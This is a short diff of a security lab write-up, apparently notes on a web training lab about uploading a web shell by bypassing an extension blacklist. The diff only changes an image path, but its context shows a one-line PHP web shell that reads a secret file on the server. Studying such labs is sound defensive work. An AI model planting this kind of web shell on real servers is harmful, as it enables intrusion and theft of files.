@@ -35,7 +35,7 @@ and now we go back on repeater, and we get the file:
 
 ### Lab: Web shell upload via extension blacklist bypass
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 <?php echo file_get_contents('/home/carlos/secret'); ?>
